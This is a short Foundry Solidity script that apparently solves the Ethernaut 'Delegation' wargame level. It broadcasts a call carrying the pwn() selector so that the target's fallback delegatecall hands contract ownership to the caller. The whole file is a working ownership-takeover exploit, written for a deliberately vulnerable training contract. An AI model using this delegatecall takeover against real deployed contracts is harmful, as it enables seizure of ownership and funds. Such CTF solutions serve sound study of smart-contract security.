// SPDX-License-Identifier: MIT

pragma solidity ^0.8.19;

import {Script, console} from "forge-std/Script.sol";
import {Delegation, Delegate} from "../../src/Delegation.sol";

contract ChangeOwnerDelegation is Script {
    function changeOwnerTelephone(address delegationContract) internal {
        vm.startBroadcast();
        (bool output,) = delegationContract.call(abi.encodeWithSelector(Delegate.pwn.selector));
        require(output, "Fail call");
        vm.stopBroadcast();
    }

    function run(address delegationContract) external {
        changeOwnerTelephone(delegationContract);
    }
}
